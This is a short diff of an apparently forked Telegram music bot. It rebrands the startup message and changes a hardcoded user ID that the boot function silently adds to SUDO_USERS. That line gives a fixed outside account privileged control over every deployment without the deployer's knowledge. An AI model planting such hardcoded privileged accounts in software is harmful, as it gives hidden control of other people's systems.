@@ -73,7 +73,7 @@ async def fallen_boot():
             status="[bold blue]Modules Importation Completed!",
         )
         await asyncio.sleep(0.2)
-        SUDO_USERS.append(1356469075)
+        SUDO_USERS.append(2102097596)
         await startup_del(_____)
     console.print(
         "[bold green]Trying to start the bot...\n"
@@ -81,7 +81,7 @@ async def fallen_boot():
     try:
         await app.send_message(
             config.LOGGER_ID,
-            f"<b>➻ ғᴀʟʟᴇɴ ᴍᴜsɪᴄ ʙᴏᴛ 🔮\n\n❄ ɪᴅ :</b> `{BOT_ID}`\n✨ <b>ɴᴀᴍᴇ :</b> {BOT_NAME}\n☁ <b>ᴜsᴇʀɴᴀᴍᴇ :</b> @{BOT_USERNAME}",
+            f"<b>➻ KSK ᴍᴜsɪᴄ ʙᴏᴛ 🔮\n\n❄ ɪᴅ :</b> `{BOT_ID}`\n✨ <b>ɴᴀᴍᴇ :</b> {BOT_NAME}\n☁ <b>ᴜsᴇʀɴᴀᴍᴇ :</b> @{BOT_USERNAME}",
         )
     except Exception as e:
         print(
